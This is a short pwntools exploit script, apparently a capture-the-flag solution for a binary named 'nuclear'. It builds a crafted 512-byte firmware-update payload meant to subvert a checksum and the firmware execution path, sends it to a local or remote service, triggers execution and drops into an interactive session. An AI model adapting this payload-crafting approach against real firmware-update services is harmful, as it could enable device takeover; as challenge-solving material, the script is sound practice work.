# firmware_body = p8(0x00) + p8(0x36)
# firmware_tail = b'\x00' * 505 + b'\x36'

from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 5002)
elif args.HOST:
    p = process('./nuclear')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./nuclear',
                  gdbscript='''
                  b *execute_firmware + 62
                  b *checksum + 227
                  b *run+267
                  c
                  ''')
# b * checksum + 202
# execute_firmware + 62
#
# update
header = b'FW12'
data4224 = b'\x38'
data4228 = b'\x33'
flag2 = b'\x35'
speed_up = b'\x36'
len = 30

middle = speed_up * len

arg56 = p8(0) + b'\xfe'

padding = b'\x00' * (512 - 4 - 6 - len - 1)

payload = header + arg56 + data4224 + b'\x00' + data4228 + middle + flag2 + padding
# 6000
p.sendlineafter(b">> 6447 Nuclear Terminal Facility (Medical Purposes Only)", b"U")
p.sendlineafter(b'>', payload)
p.recvline()

p.sendline(b'E')
print(p.recvlines(11))

p.interactive()
